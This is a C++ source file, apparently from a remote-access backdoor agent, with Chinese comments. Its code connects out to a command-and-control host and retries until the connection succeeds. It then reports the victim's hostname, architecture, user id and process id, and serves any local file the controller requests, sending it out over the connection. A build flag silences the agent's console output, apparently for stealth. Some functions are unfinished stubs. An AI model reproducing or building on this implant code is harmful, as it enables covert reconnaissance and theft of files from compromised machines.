#include <arpa/inet.h>
#include <fcntl.h>
#include <netdb.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#include "Agent.h"

int HttpServer::_connec() {
    for (int i = 0; i < ports_.size(); i++) {
        struct sockaddr_in server_addr;
        struct sockaddr_in client_addr;
        struct hostent*    server_host;

        int ccFd_ = socket(AF_INET, SOCK_STREAM, 0);

        if (ccFd_ < 0) {
            perror("socket");
            return -1;
        }

        server_host = gethostbyname(ccIp_.c_str());

        if (server_host == NULL) {
            fprintf(stderr, "gethostbyname failed.\n");
            return -1;
        }

        memcpy((void*)&server_addr.sin_addr, (void*)server_host->h_addr,
               server_host->h_length);

        server_addr.sin_family = AF_INET;
        server_addr.sin_port   = htons(ports_[i]);

        /* connect to the remote host */
        while (1) {
            int ret = connect(ccFd_, (struct sockaddr*)&server_addr,
                              sizeof(server_addr));
            if (ret < 0) {
                sleep(3);
#ifndef AGENT_BACK
                std::cout << "wait for accept my connect\n";
#endif
            }

            else {
#ifndef AGENT_BACK
                std::cout << "connect success\n";
#endif
                break;
            }
        }

        fds_.push_back(ccFd_);
    }

    _Response_osInfo();
    return 0;
}

#include <sys/utsname.h>
int HttpServer::_Response_osInfo() {
    // 用shellFd传输
    HttpRequest*   httpHandler_ = new HttpRequest(fds_[0]);
    int            Errno, fb = 0;
    struct utsname os_Info;
    string         sysname;
    string         version;
    string         machine;
    int            uid = getuid();
    int            pid = getpid();
    fb                 = uname(&os_Info);
    if (fb < 0) {
        sysname = "unknow";
        version = "unknow";
        machine = "unknow";
    } else {
        sysname = os_Info.sysname;
        version = os_Info.version;
        machine = os_Info.machine;
    }

    char name[256];
    gethostname(name, sizeof(name));

    HttpResponse response(200);
    // response.addHeader("Sys_Name",sysname);
    response.addHeader("Sys_Name", name);
    // response.addHeader("Sys_Version",version);
    response.addHeader("Sys_Machine", machine);
    response.addHeader("Cur_Uid", std::to_string(uid));
    response.addHeader("Cur_pid", std::to_string(pid));
    response.createResponse(&(httpHandler_->outBuff_));

    int ret = httpHandler_->write(&Errno);

    delete (httpHandler_);
    return 0;
}

int HttpServer::_events_CC_readable(HttpRequest* httphandler) {
    httphandler->resetParse();

    int readError, nRead;

    while (!httphandler->parseFinish()) {
        nRead = httphandler->read(&readError);

        // 断开连接
        if (nRead == 0) {
            return CLOSE;
        }
        if (nRead < 0) {
            return ERROR;
        }

        if (httphandler->parseRequest() != HttpRequest::GotAll)
            continue;
    }

    return SUCCESS;
}

int HttpServer::putFile(HttpRequest* httpHandler, string path) {
    return SUCCESS;
}

int HttpServer::getFile(HttpRequest* httpHandler, string path) {
    int         ret, Errno;
    struct stat buffer;
    int         fd;
    long long   size;
    long long   sum = 0;

    // pre tarsf
    if (access(path.c_str(), 0) != F_OK ||
        stat(path.c_str(), &buffer) != 0 || (!S_ISREG(buffer.st_mode))) {
        // std::cout << "\n[invalid local path]: Please check and try again\n";
        HttpResponse response(404);
        response.createResponse(&(httpHandler->outBuff_));
        ret = httpHandler->write(&Errno);
        return SUCCESS;
    }
    size = buffer.st_size;

    fd = open(path.c_str(), O_RDONLY);
    if (fd < 0) {
        HttpResponse response(404);
        response.createResponse(&(httpHandler->outBuff_));
        ret = httpHandler->write(&Errno);
        return SUCCESS;
    }

    while (1) {
        Buffer _outBuff;
        ret = _outBuff.readFd(fd, &Errno);

        if (ret > 0) {
            HttpResponse response(200);
            response.addHeader("Ftp-Size", std::to_string(size));
            response.setBody(_outBuff.peek(), _outBuff.readableBytes());
            response.createResponse(&(httpHandler->outBuff_));
            int tem = _outBuff.readableBytes();
            _outBuff.retrieveAll();
            ret = httpHandler->write(&Errno);
            sum += tem;

#ifndef AGENT_BACK
            std::cout << "[FTP_Server] 请求文件大小:" << size
                      << "   目前总计发了:" << sum
                      << " 本次实际发送了(算http头):" << ret << std::endl;
#endif
            if (ret <= 0) {
#ifndef AGENT_BACK
                std::cout << "Ftpd::getFile():httpHandler->write Error"
                          << Errno << "\n";
#endif
                return CLOSE;
            }
        }
        if (ret <= 0) {
            close(fd);
            break;
        }
    }

    delete (httpHandler);
    return SUCCESS;
}

int HttpServer::httpServerResart() {
    // free all resource

    // _connec();

    // 线程不销毁
}
